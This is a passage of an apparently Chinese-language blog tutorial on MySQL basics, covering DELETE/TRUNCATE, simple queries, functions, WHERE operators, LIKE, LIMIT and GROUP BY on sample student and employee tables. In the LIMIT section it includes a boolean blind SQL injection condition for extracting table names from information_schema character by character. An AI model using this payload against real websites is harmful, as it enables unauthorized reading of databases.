class="string">&#x27;female&#x27;</span>),(<span class="number">8</span>,<span class="string">&#x27;sam&#x27;</span>,<span class="number">14</span>,<span class="string">&#x27;male&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>DELETE基本语法</p>
</li>
</ol>
<p>在该语法中：表名用于指定要执行删除操作的表；[WHERE 条件表达式]为可选参数用于指定删除的条件。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名 [<span class="keyword">WHERE</span> 条件表达式];</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>DELETE删除部分数据</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">删除age等于<span class="number">14</span>的所有记录</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> student <span class="keyword">where</span> age<span class="operator">=</span><span class="number">14</span>;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>DELETE删除全部数据</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">删除student表中的所有记录</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>TRUNCATE与DELETE的区别</p>
</li>
</ol>
<p>TRUNCATE和DELETE都能实现删除表中的所有数据的功能，但两者也是有区别的：<br>
1、DELETE语句后可跟WHERE子句，可通过指定WHERE子句中的条件表达式只删除满足条件的部分记录；但是，TRUNCATE语句只能用于删除表中的所有记录。<br>
2、使用TRUNCATE语句删除表中的数据后，再次向表中添加记录时自动增加字段的默认初始值重新由1开始；使用DELETE语句删除表中所有记录后，再次向表中添加记录时自动增加字段的值为删除时该字段的最大值加1<br>
3、DELETE语句是DML语句，TRUNCATE语句通常被认为是DDL语句</p>
<h2 id="简单查询">简单查询</h2>
<p>简单查询即不含where的select语句。在此，我们讲解简单查询中最常用的两种查询：查询所有字段和查询指定字段。在此，先准备测试数据，代码如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="keyword">CREATE</span> DATABASE mydb;</span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建student表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">    sid <span class="type">CHAR</span>(<span class="number">6</span>),</span><br><span class="line">    sname <span class="type">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    age <span class="type">INT</span>,</span><br><span class="line">    gender <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;male&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向student表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1001&#x27;</span>, <span class="string">&#x27;lili&#x27;</span>, <span class="number">14</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1002&#x27;</span>, <span class="string">&#x27;wang&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1003&#x27;</span>, <span class="string">&#x27;tywd&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1004&#x27;</span>, <span class="string">&#x27;hfgs&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1005&#x27;</span>, <span class="string">&#x27;qwer&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1006&#x27;</span>, <span class="string">&#x27;zxsd&#x27;</span>, <span class="number">19</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1007&#x27;</span>, <span class="string">&#x27;hjop&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1008&#x27;</span>, <span class="string">&#x27;tyop&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1009&#x27;</span>, <span class="string">&#x27;nhmk&#x27;</span>, <span class="number">13</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1010&#x27;</span>, <span class="string">&#x27;xdfv&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>数据表简单查询示例</p>
<figure class="highlight sql"><figcaption><span>数据表简单查询示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>查询所有字段（方法不唯一）</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>查询指定字段（sid、sname）</span><br><span class="line"><span class="keyword">select</span> sid,sname <span class="keyword">from</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>常数的查询（日期标记）</span><br><span class="line"><span class="keyword">select</span> sid,sname,<span class="string">&#x27;2021-03-02&#x27;</span> <span class="keyword">from</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>从查询结果中过滤重复数据</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> gender <span class="keyword">from</span> student;</span><br><span class="line">注： 在<span class="keyword">SELECT</span>查询语句中<span class="keyword">DISTINCT</span>关键字只能用在第一个所查列名之前</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>算术运算符</span><br><span class="line"> <span class="keyword">select</span> sname,age<span class="operator">+</span><span class="number">10</span> <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<h2 id="函数">函数</h2>
<h3 id="聚合函数">聚合函数</h3>
<p>在开发中，我们常常有类似的需求：统计某个字段的最大值、最小值、 平均值等等。为此，MySQL中提供了聚合函数来实现这些功能。所谓聚合，就是将多行汇总成一行；其实，所有的聚合函数均如此——输入多行，输出一行。聚合函数具有自动滤空的功能，若某一个值为NULL，那么会自动将其过滤使其不参与运算。</p>
<p><strong>聚合函数使用规则：</strong><br>
只有SELECT子句和HAVING子句、ORDER BY子句中能够使用聚合函数。例如，在WHERE子句中使用聚合函数是错误的。接下来，我们学习常用聚合函数。</p>
<ol>
<li class="lvl-3">
<p>count()</p>
</li>
</ol>
<p>统计表中数据的行数或者统计指定列其值不为NULL的数据个数</p>
<p><em>查询有多少该表中有多少人</em></p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>max()</p>
</li>
</ol>
<p>计算指定列的最大值，如果指定列是字符串类型则使用字符串排序运算</p>
<p><em>查询该学生表中年纪最大的学生</em></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">max</span>(<span class="params">age</span>) <span class="keyword">from</span> student</span>;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>min()</p>
</li>
</ol>
<p>计算指定列的最小值，如果指定列是字符串类型则使用字符串排序运算</p>
<p>查询该学生表中年纪最小的学生 MySQL命令：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sname,<span class="built_in">min</span>(age) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>sum()</p>
</li>
</ol>
<p>计算指定列的数值和，如果指定列类型不是数值类型则计算结果为0</p>
<p>查询该学生表中年纪的总和 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">sum</span>(age) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p>avg()</p>
</li>
</ol>
<p>计算指定列的平均值，如果指定列类型不是数值类型则计算结果为</p>
<p>查询该学生表中年纪的平均数 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">avg</span>(age) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<h3 id="其他函数">其他函数</h3>
<ol>
<li class="lvl-3">
<p>时间函数</p>
</li>
</ol>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> NOW();</span><br><span class="line"><span class="keyword">SELECT</span> DAY (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">DATE</span> (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">TIME</span> (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> YEAR (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> MONTH (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_DATE</span>();</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_TIME</span>();</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_TIMESTAMP</span>();</span><br><span class="line"><span class="keyword">SELECT</span> ADDTIME(<span class="string">&#x27;14:23:12&#x27;</span>,<span class="string">&#x27;01:02:01&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> DATE_ADD(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> DAY);</span><br><span class="line"><span class="keyword">SELECT</span> DATE_ADD(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> MONTH);</span><br><span class="line"><span class="keyword">SELECT</span> DATE_SUB(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> DAY);</span><br><span class="line"><span class="keyword">SELECT</span> DATE_SUB(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> MONTH);</span><br><span class="line"><span class="keyword">SELECT</span> DATEDIFF(<span class="string">&#x27;2019-07-22&#x27;</span>,<span class="string">&#x27;2019-05-05&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>字符串函数</p>
</li>
</ol>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">--连接函数</span><br><span class="line"><span class="section">SELECT CONCAT ()</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">SELECT INSTR ();</span><br><span class="line">--统计长度</span><br><span class="line">SELECT LENGTH();</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>数学函数</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 绝对值</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">ABS</span>(<span class="number">-136</span>);</span><br><span class="line"><span class="comment">-- 向下取整</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">FLOOR</span>(<span class="number">3.14</span>);</span><br><span class="line"><span class="comment">-- 向上取整</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CEILING</span>(<span class="number">3.14</span>);</span><br></pre></td></tr></table></figure>
<h2 id="条件查询">条件查询</h2>
<p>数据库中存有大量数据，我们可根据需求获取指定的数据。此时，我们可在查询语句中通过WHERE子句指定查询条件对查询结果进行过滤。在开始学习条件查询之前，我们先准备测试数据，代码如下：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> mydb;</span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建student表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">    sid <span class="type">CHAR</span>(<span class="number">6</span>),</span><br><span class="line">    sname <span class="type">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    age <span class="type">INT</span>,</span><br><span class="line">    gender <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;male&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向student表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1001&#x27;</span>, <span class="string">&#x27;lili&#x27;</span>, <span class="number">14</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1002&#x27;</span>, <span class="string">&#x27;wang&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1003&#x27;</span>, <span class="string">&#x27;tywd&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1004&#x27;</span>, <span class="string">&#x27;hfgs&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1005&#x27;</span>, <span class="string">&#x27;qwer&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1006&#x27;</span>, <span class="string">&#x27;zxsd&#x27;</span>, <span class="number">19</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1007&#x27;</span>, <span class="string">&#x27;hjop&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1008&#x27;</span>, <span class="string">&#x27;tyop&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1009&#x27;</span>, <span class="string">&#x27;nhmk&#x27;</span>, <span class="number">13</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1010&#x27;</span>, <span class="string">&#x27;xdfv&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1012&#x27;</span>, <span class="string">&#x27;lili&#x27;</span>, <span class="number">14</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1013&#x27;</span>, <span class="string">&#x27;wang&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="关系运算符">关系运算符</h3>
<p>在WHERE中可使用关系运算符进行条件查询，常用的关系运算符如下所示：</p>
<table>
<thead>
<tr>
<th style="text-align:center">关系运算符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">=</td>
<td style="text-align:center">等于</td>
</tr>
<tr>
<td style="text-align:center">&lt;&gt;</td>
<td style="text-align:center">不等于</td>
</tr>
<tr>
<td style="text-align:center">!=</td>
<td style="text-align:center">不等于</td>
</tr>
<tr>
<td style="text-align:center">&lt;</td>
<td style="text-align:center">小于</td>
</tr>
<tr>
<td style="text-align:center">&lt;=</td>
<td style="text-align:center">小于等于</td>
</tr>
<tr>
<td style="text-align:center">&gt;</td>
<td style="text-align:center">大于</td>
</tr>
<tr>
<td style="text-align:center">&gt;=</td>
<td style="text-align:center">大于等于</td>
</tr>
</tbody>
</table>
<h3 id="常用的关键字">常用的关键字</h3>
<ol>
<li class="lvl-3">
<p>AND关键字</p>
</li>
</ol>
<p>查询年纪大于15且性别为male的学生信息 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> age&gt;<span class="number">15</span> and gender=<span class="string">&#x27;male&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>OR关键字</p>
</li>
</ol>
<p>查询年纪大于15或者性别为male的学生信息</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> age&gt;<span class="number">15</span> or gender=<span class="string">&#x27;male&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>IN关键字</p>
</li>
</ol>
<p>IN关键字用于判断某个字段的值是否在指定集合中。如果字段的值恰好在指定的集合中，则将字段所在的记录将査询出来。</p>
<p>查询sid为S_1002和S_1003的学生信息</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="function"><span class="keyword">from</span> student <span class="keyword">where</span> sid <span class="title">in</span> (<span class="params"><span class="string">&#x27;S_1002&#x27;</span>,<span class="string">&#x27;S_1003&#x27;</span></span>)</span>;</span><br></pre></td></tr></table></figure>
<p>查询sid为S_1001以外的学生的信息</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="function"><span class="keyword">from</span> student <span class="keyword">where</span> sid <span class="keyword">not</span> <span class="title">in</span> (<span class="params"><span class="string">&#x27;S_1001&#x27;</span></span>)</span>;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>BETWEEN AND关键字</p>
</li>
</ol>
<p>BETWEEN AND用于判断某个字段的值是否在指定的范围之内。如果字段的值在指定范围内，则将所在的记录将查询出来（好像不太一定等于右边的还是左边的）</p>
<p>查询15到18岁的学生信息</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> age <span class="keyword">between</span> <span class="number">15</span> <span class="keyword">and</span> <span class="number">18</span>;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p>NULL关键字</p>
</li>
</ol>
<p>在MySQL中，使用 IS NULL关键字判断字段的值是否为空值。请注意：空值NULL不同于0，也不同于空字符串</p>
<p>查询sname不为空值的学生信息</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">is</span> not <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
<h3 id="LIKE关键字">LIKE关键字</h3>
<p>在 MySQL 中， LIKE 运算符可以根据指定的模式过滤数据。LIKE 运算符一般用于模糊匹配字符数据。<code>LIKE</code> 运算符是一个双目比较运算符，需要两个操作数。 <code>LIKE</code> 运算符语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">expression <span class="keyword">LIKE</span> <span class="keyword">pattern</span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>expression 可以是一个字段名、值或其他的表达式（比如函数调用、运算等）。<br>
pattern 是一个字符串模式。MySQL 字符串模式支持两个通配符： % 和 _。</p>
<ul class="lvl-2">
<li class="lvl-4">% 匹配零或多个任意字符。</li>
<li class="lvl-5">_ 匹配单个任意字符。</li>
<li class="lvl-5">如果需要匹配通配符，则需要使用 \ 转义字符，如 % 和 _。</li>
<li class="lvl-5">使用通配符匹配文本时，不区分字母大小写。</li>
</ul>
</li>
<li class="lvl-2">
<p>如果 expression 与 pattern 匹配，LIKE 运算符返回 1，否则返回 0。</p>
</li>
</ul>
<p>常用：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>a%</code> 匹配以字符 a 开头的任意长度的字符串。</p>
</li>
<li class="lvl-2">
<p><code>%a</code> 匹配以字符 a 结尾的任意长度的字符串。</p>
</li>
<li class="lvl-2">
<p><code>%a%</code> 匹配包含字符 a 的任意长度的字符串。</p>
</li>
<li class="lvl-2">
<p><code>%a%b%</code> 匹配同时包含字符 a 和 b 且 a 在 b 前面的任意长度的字符串。</p>
</li>
<li class="lvl-2">
<p><code>a_</code> 匹配以字符 a 开头长度为 2 字符串。</p>
</li>
<li class="lvl-2">
<p><code>_a</code> 匹配以字符 a 结尾长度为 2 字符串。</p>
</li>
<li class="lvl-2">
<p>使用<code>NOT LIKE</code>进行否认查询</p>
</li>
</ul>
<ol>
<li class="lvl-4">
<p>普通字符串</p>
</li>
</ol>
<p>查询sname中与wang匹配的学生信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;wang&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>含有%通配的字符串</p>
</li>
</ol>
<p>%用于匹配任意长度的字符串。例如，字符串“a%”匹配以字符a开始任意长度的字符串</p>
<p>查询学生姓名以li开始的记录 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;li%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>查询学生姓名以g结尾的记录 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;%g&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>查询学生姓名包含s的记录 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;%s%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>含有_通配的字符串</p>
</li>
</ol>
<p>下划线通配符只匹配单个字符，如果要匹配多个字符，需要连续使用多个下划线通配符。例如，字符串“ab_”匹配以字符串“ab”开始长度为3的字符串，如abc、abp等等；字符串“a__d”匹配在字符“a”和“d”之间包含两个字符的字符串，如&quot;abcd&quot;、&quot;atud&quot;等等。</p>
<p>查询学生姓名以zx开头且长度为4的记录 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;zx__&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>查询学生姓名以g结尾且长度为4的记录 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;___g&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="使用LIMIT限制查询结果的数量">使用LIMIT限制查询结果的数量</h3>
<p>当执行查询数据时可能会返回很多条记录，而用户需要的数据可能只是其中的一条或者几条。比如在进行bool盲注入对数据库的所有表名进行爆破的时候，需要单独提取每一个表名分别进行爆破。语句如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name limit [<span class="keyword">offset</span>，] <span class="keyword">rows</span></span><br></pre></td></tr></table></figure>
<p>参数说明：<br>
<strong>offset：指定第一个返回记录行的偏移量（即从哪一行开始返回），注意：初始行的偏移量为0。<br>
rows：返回具体行数。</strong></p>
<p><strong>总结：如果limit后面是一个参数，就是检索前多少行。如果limit后面是2个参数，就是从offset+1行开始，检索rows行记录。</strong></p>
<p>举例：</p>
<p>查询学生表中年纪最小的3位同学 MySQL命令：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">asc</span> <span class="keyword">limit</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<p>表名盲注SQL爆破时的判断语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;ascii(substr((select table_name from information_schema.tables limit &#123;index&#125;,1),&#123;i&#125;,1)) &gt; &#123;mid&#125;--+</span></span><br></pre></td></tr></table></figure>
<h3 id="使用GROUP-BY进行分组查询">使用GROUP BY进行分组查询</h3>
<p>GROUP BY 子句可像切蛋糕一样将表中的数据进行分组，再进行查询等操作。换言之，可通俗地理解为：通过GROUP BY将原来的表拆分成了几张小表。</p>
<p>接下来，我们通过一个例子开始学习GROUP BY，代码如下</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> mydb;</span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建员工表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employee (</span><br><span class="line">    id <span class="type">int</span>,</span><br><span class="line">    <span class="type">name</span> <span class="type">varchar</span>(<span class="number">50</span>),</span><br><span class="line">    salary <span class="type">int</span>,</span><br><span class="line">    departmentnumber <span class="type">int</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向员工表中插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;tome&#x27;</span>,<span class="number">2000</span>,<span class="number">1001</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">&#x27;lucy&#x27;</span>,<span class="number">9000</span>,<span class="number">1002</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">3</span>,<span class="string">&#x27;joke&#x27;</span>,<span class="number">5000</span>,<span class="number">1003</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">4</span>,<span class="string">&#x27;wang&#x27;</span>,<span class="number">3000</span>,<span class="number">1004</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">5</span>,<span class="string">&#x27;chen&#x27;</span>,<span class="number">3000</span>,<span class="number">1001</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">6</span>,<span class="string">&#x27;yukt&#x27;</span>,<span class="number">7000</span>,<span class="number">1002</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">7</span>,<span class="string">&#x27;rett&#x27;</span>,<span class="number">6000</span>,<span class="number">1003</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">8</span>,<span class="string">&#x27;mujk&#x27;</span>,<span class="number">4000</span>,<span class="number">1004</span>); </span><br><span 